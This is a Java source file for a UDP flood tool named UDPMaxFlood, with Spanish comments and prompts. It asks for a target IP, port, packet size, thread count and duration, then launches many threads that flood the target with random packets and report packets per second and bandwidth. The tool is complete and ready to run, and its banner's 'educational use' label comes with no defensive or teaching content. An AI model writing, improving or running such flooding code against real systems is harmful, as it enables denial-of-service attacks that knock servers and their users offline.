import java.net.*;
import java.util.Random;
import java.util.concurrent.atomic.AtomicLong;
import java.util.Scanner;

public class UDPMaxFlood {
    private static AtomicLong packetCount = new AtomicLong(0);
    private static volatile boolean running = true;
    private static long startTime = 0;
    private static int packetSize = 0;
    
    public static void main(String[] args) {
        // Verificar si se proporcionaron argumentos por línea de comandos
        if (args.length >= 4) {
            // Modo línea de comandos
            try {
                String targetIP = args[0];
                int targetPort = Integer.parseInt(args[1]);
                packetSize = Integer.parseInt(args[2]);
                int threadCount = Integer.parseInt(args[3]);
                int duration = (args.length >= 5) ? Integer.parseInt(args[4]) : 0;
                
                // Validaciones básicas
                if (packetSize < 1472 || packetSize > 65500) {
                    System.out.println("Error: Tamaño de paquete inválido (1472-65500 bytes)");
                    return;
                }
                
                System.out.println("[!] Iniciando ataque UDP en modo línea de comandos...");
                System.out.println("   Target: " + targetIP + ":" + targetPort);
                System.out.println("   Hilos: " + threadCount);
                System.out.println("   Tamaño de paquete: " + packetSize + " bytes");
                System.out.println("   Duración: " + (duration > 0 ? duration + " segundos" : "Infinita"));
                
                startAttack(targetIP, targetPort, threadCount, duration);
                
            } catch (Exception e) {
                System.out.println("Error en parámetros: " + e.getMessage());
                System.out.println("Uso: java UDPMaxFlood <IP> <puerto> <tamaño> <hilos> [duración]");
            }
        } else {
            // Modo interactivo
            showBanner();
            interactiveMode();
        }
    }
    
    private static void showBanner() {
        System.out.println("\u001B[31m");
        System.out.println("███████╗██╗      ██████╗  ██████╗ ██████╗ ");
        System.out.println("██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗");
        System.out.println("█████╗  ██║     ██║   ██║██║   ██║██║  ██║");
        System.out.println("██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║");
        System.out.println("██╗     ███████╗╚██████╔╝╚██████╔╝██████╔╝");
        System.out.println("╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ");
        System.out.println("\u001B[33m");
        System.out.println("       HERRAMIENTA UDP FLOOD (JAVA)");
        System.out.println("\u001B[36m       Para uso educativo\u001B[0m\n");
    }
    
    private static void interactiveMode() {
        try {
            Scanner scanner = new Scanner(System.in);
            
            System.out.print("[?] Ingresa la IP objetivo: ");
            String targetIP = scanner.nextLine();
            
            System.out.print("[?] Ingresa el puerto objetivo (ej: 19132): ");
            int targetPort = Integer.parseInt(scanner.nextLine());
            
            System.out.print("[?] Tamaño de paquete (1472-65500 bytes): ");
            packetSize = Integer.parseInt(scanner.nextLine());
            
            System.out.print("[?] Número de hilos (recomendado: " + 
                           Runtime.getRuntime().availableProcessors() * 2 + "): ");
            int threadCount = Integer.parseInt(scanner.nextLine());
            
            System.out.print("[?] Duración en segundos (0 = infinito): ");
            int duration = Integer.parseInt(scanner.nextLine());
            
            // Validaciones
            if (packetSize < 1472 || packetSize > 65500) {
                System.out.println("Error: Tamaño de paquete inválido");
                return;
            }
            
            System.out.println("\n[!] Configuración del ataque:");
            System.out.println("   Target: " + targetIP + ":" + targetPort);
            System.out.println("   Hilos: " + threadCount);
            System.out.println("   Tamaño de paquete: " + packetSize + " bytes");
            System.out.println("   Duración: " + (duration > 0 ? duration + " segundos" : "Infinita"));
            
            System.out.print("\n[!] ¿Iniciar ataque? (s/n): ");
            String confirm = scanner.nextLine();
            
            if (!confirm.equalsIgnoreCase("s") && !confirm.equalsIgnoreCase("si")) {
                System.out.println("Ataque cancelado");
                return;
            }
            
            startAttack(targetIP, targetPort, threadCount, duration);
            scanner.close();
            
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
    
    private static void startAttack(String targetIP, int targetPort, int threadCount, int duration) {
        try {
            System.out.println("\n[!] Iniciando ataque UDP... Ctrl+C para detener");
            
            // Iniciar estadísticas
            startTime = System.currentTimeMillis();
            Thread statsThread = new Thread(UDPMaxFlood::showStats);
            statsThread.setDaemon(true);
            statsThread.start();
            
            // Crear hilos de ataque
            Thread[] threads = new Thread[threadCount];
            for (int i = 0; i < threadCount; i++) {
                threads[i] = new Thread(new FloodWorker(targetIP, targetPort, i));
                threads[i].start();
            }
            
            // Control de tiempo
            if (duration > 0) {
                Thread.sleep(duration * 1000);
                running = false;
                System.out.println("\n[!] Ataque completado por tiempo");
            } else {
                // Esperar indefinidamente
                while (running) {
                    Thread.sleep(1000);
                }
            }
            
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
    
    static class FloodWorker implements Runnable {
        private final String targetIP;
        private final int targetPort;
        private final int threadId;
        
        public FloodWorker(String targetIP, int targetPort, int threadId) {
            this.targetIP = targetIP;
            this.targetPort = targetPort;
            this.threadId = threadId;
        }
        
        @Override
        public void run() {
            try {
                DatagramSocket socket = new DatagramSocket();
                InetAddress address = InetAddress.getByName(targetIP);
                
                // Crear payload aleatorio
                byte[] payload = new byte[packetSize];
                new Random().nextBytes(payload);
                
                DatagramPacket packet = new DatagramPacket(
                    payload, payload.length, address, targetPort
                );
                
                // Bucle de ataque
                while (running) {
                    // Envío por lotes para mejor rendimiento
                    for (int i = 0; i < 100 && running; i++) {
                        socket.send(packet);
                        packetCount.incrementAndGet();
                    }
                }
                
                socket.close();
                
            } catch (Exception e) {
                System.out.println("Error en hilo " + threadId + ": " + e.getMessage());
            }
        }
    }
    
    private static void showStats() {
        while (running) {
            try {
                Thread.sleep(2000);
                
                long elapsed = (System.currentTimeMillis() - startTime) / 1000;
                if (elapsed > 0) {
                    long count = packetCount.get();
                    double pps = (double) count / elapsed;
                    double mbps = (count * packetSize * 8) / (elapsed * 1000000.0);
                    
                    System.out.printf("\r[ESTADÍSTICAS] Paquetes: %,d | PPS: %,.0f | Ancho de banda: %.2f Mbps", 
                                     count, pps, mbps);
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }
    
    // Manejar Ctrl+C
    static {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running = false;
            System.out.println("\n\n[!] Deteniendo ataque...");
        }));
    }
}
